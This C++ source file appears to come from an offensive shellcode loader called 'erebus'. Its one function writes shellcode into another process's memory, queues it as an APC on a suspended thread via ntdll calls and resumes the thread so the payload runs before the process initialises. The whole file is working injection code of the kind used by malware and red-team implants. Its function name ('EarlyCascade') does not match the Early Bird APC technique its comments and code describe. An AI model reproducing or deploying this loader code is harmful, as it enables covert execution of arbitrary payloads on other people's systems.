#include "../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 4
	VOID InjectionEarlyCascade(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. EarlyCascade (Early Bird APC)");

		PVOID base_address = NULL;

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
		typeNtQueueApcThread NtQueueApcThread = (typeNtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		// Queue APC to suspended thread (Early Bird technique)
		NTSTATUS status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to queue APC (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("APC queued to suspended thread");

		// Resume thread to execute APC
		status = NtResumeThread(hThread, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("Thread resumed, shellcode executing before process initialization");

		NtClose(hThread);
		NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
#endif
} // namespace erebus
